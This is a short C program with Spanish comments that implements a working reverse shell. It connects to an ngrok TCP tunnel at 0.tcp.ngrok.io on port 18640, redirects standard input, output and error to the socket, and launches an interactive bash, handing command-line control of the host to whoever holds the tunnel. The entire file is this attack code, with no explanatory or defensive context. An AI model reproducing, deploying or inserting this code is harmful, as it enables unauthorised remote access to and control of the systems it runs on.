
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>

int main() {
    int sock;
    struct sockaddr_in server;

    // Dirección y puerto del túnel ngrok
    char *server_ip = "0.tcp.ngrok.io";
    int server_port = 18640;

    // Crear socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("socket");
        exit(1);
    }

    // Resolver IP usando DNS
    struct hostent *he = gethostbyname(server_ip);
    if (he == NULL) {
        herror("gethostbyname");
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(server_port);
    server.sin_addr = *((struct in_addr *)he->h_addr);

    // Conectar
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        exit(1);
    }

    // Redirigir stdin, stdout y stderr al socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Ejecutar shell
    execl("/bin/bash", "bash", "-i", NULL);

    return 0;
}
